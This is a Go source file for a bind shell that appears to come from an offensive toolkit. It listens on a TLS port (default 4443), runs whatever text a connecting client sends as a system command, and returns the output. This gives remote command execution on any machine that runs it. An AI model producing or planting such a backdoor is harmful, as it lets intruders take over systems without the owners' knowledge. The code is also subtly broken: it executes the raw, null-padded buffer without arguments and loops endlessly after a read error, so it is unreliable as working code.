package bindShell

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

func runCmd(cmd string, conn net.Conn) string {
	out, err := exec.Command(strings.Split(cmd, "\n")[0]).Output()
	if err != nil {
		fmt.Fprintf(conn, "%s\n", err)
	}
	fmt.Fprintf(conn, "$ %s\n", cmd)
	fmt.Fprintf(conn, "%s\n", out)
	return string(out)
}

func handleConnection(conn net.Conn) {
	// While loop over command input
	for {
		// Make a buffer to hold incoming data.
		buf := make([]byte, 1024)
		// Read the incoming connection into the buffer.
		_, err := conn.Read(buf)
		if err != nil {
			fmt.Println("Error reading:", err.Error())
		}
		runCmd(string(buf), conn)
	}

	//Close the connection when you're done with it.
	conn.Close()
}

func readFile(fileName string) []byte {
	file, err := os.Open(fileName)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	b, err := ioutil.ReadAll(file)
	return b
}

func Run() {
	port := flag.String("p", "4443", "Port to listen on")
	flag.Parse()

	cert := readFile("certificates/bindShell/tls.cert")
	key := readFile("certificates/bindShell/tls.key")

	cer, err := tls.X509KeyPair(cert, key)
	if err != nil {
		log.Fatal(err)
	}
	config := &tls.Config{MinVersion:               tls.VersionTLS12,
		CurvePreferences:         []tls.CurveID{tls.CurveP521, tls.CurveP384, tls.CurveP256},
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
			tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_RSA_WITH_AES_256_CBC_SHA,
		}, Certificates: []tls.Certificate{cer},
	}

	tln, err := tls.Listen("tcp", ":" + *port, config)
	if err != nil {
		log.Fatal(err)
	}
	defer tln.Close()

	for {
		conn, err := tln.Accept()
		if err != nil {
			// handle error
		}
		go handleConnection(conn)
	}
}
